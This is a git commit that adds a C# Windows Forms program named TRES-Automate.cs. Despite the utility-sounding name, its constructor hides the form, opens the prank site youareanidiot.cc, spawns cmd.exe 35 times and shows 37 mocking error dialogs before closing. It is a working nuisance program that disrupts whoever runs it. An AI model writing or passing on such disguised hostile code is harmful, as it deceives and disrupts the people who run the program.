04c5fd7e008b7eebeef3141c0ca5978973d7a6f4
TrueCubeYT <61812799+TrueCubeYT@users.noreply.github.com>
2020-07-01 11:50:16 -0400

    Create TRES-Automate.cs

---
+++ TRES Automate/TRES-Automate.cs
@@ -0,0 +1,102 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+namespace TRES_0._1_Automate
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            this.Hide();
+            InitializeComponent();
+            Process.Start("https://youareanidiot.cc");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            Process.Start("cmd.exe");
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            MessageBox.Show("HAHAHHAHAHHA", "SHIT", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Error);
+            this.Close();
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
